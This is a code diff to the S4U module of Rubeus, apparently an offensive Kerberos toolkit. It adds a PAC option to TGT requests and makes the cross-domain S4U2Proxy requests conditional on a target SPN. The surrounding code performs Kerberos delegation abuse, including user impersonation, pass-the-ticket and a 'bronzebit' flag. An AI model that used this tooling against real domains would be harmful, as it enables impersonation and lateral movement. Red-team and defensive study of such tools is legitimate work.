@@ -11,10 +11,10 @@ namespace Rubeus
 {
     public class S4U
     {
-        public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool self = false, bool opsec = false, bool bronzebit = false)
+        public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool self = false, bool opsec = false, bool bronzebit = false, bool pac = true)
         {
             // first retrieve a TGT for the user
-            byte[] kirbiBytes = Ask.TGT(userName, domain, keyString, etype, null, false, domainController, new LUID(), false, opsec);
+            byte[] kirbiBytes = Ask.TGT(userName, domain, keyString, etype, null, false, domainController, new LUID(), false, opsec, "", false, pac);
 
             if (kirbiBytes == null)
             {
@@ -632,16 +632,20 @@ namespace Rubeus
             Console.WriteLine("[*] Requesting the S4U2Self ticket from {0}", domain);
             KRB_CRED localSelf = CrossDomainS4U2Self(user, target, domainController, foreignSelf.tickets[0], crossKey, crossEtype, Interop.KERB_ETYPE.subkey_keymaterial, false);
 
-            // Using our standard TGT and attaching our local S4U2Self
-            // retrieve an S4U2Proxy from our DC
-            // This will be needed for the last request
-            KRB_CRED localS4U2Proxy = CrossDomainS4U2Proxy(user, target, targetSPN, domainController, ticket, clientKey, etype, Interop.KERB_ETYPE.subkey_keymaterial, localSelf.tickets[0], false);
-            crossEtype = (Interop.KERB_ETYPE)crossTGS.enc_part.ticket_info[0].key.keytype;
-            crossKey = crossTGS.enc_part.ticket_info[0].key.keyvalue;
+            if (!String.IsNullOrEmpty(targetSPN))
+            {
 
-            // Lastly retrieve the final S4U2Proxy from the foreign domains DC
-            // This is the service ticket we need to access the target service
-            KRB_CRED foreignS4U2Proxy = CrossDomainS4U2Proxy(user, target, targetSPN, targetDomainController, crossTGS.tickets[0], crossKey, crossEtype, Interop.KERB_ETYPE.subkey_keymaterial, localS4U2Proxy.tickets[0], true, ptt);
+                // Using our standard TGT and attaching our local S4U2Self
+                // retrieve an S4U2Proxy from our DC
+                // This will be needed for the last request
+                KRB_CRED localS4U2Proxy = CrossDomainS4U2Proxy(user, target, targetSPN, domainController, ticket, clientKey, etype, Interop.KERB_ETYPE.subkey_keymaterial, localSelf.tickets[0], false);
+                crossEtype = (Interop.KERB_ETYPE)crossTGS.enc_part.ticket_info[0].key.keytype;
+                crossKey = crossTGS.enc_part.ticket_info[0].key.keyvalue;
+
+                // Lastly retrieve the final S4U2Proxy from the foreign domains DC
+                // This is the service ticket we need to access the target service
+                KRB_CRED foreignS4U2Proxy = CrossDomainS4U2Proxy(user, target, targetSPN, targetDomainController, crossTGS.tickets[0], crossKey, crossEtype, Interop.KERB_ETYPE.subkey_keymaterial, localS4U2Proxy.tickets[0], true, ptt);
+            }
         }
 
         // to perform the 2 S4U2Self requests
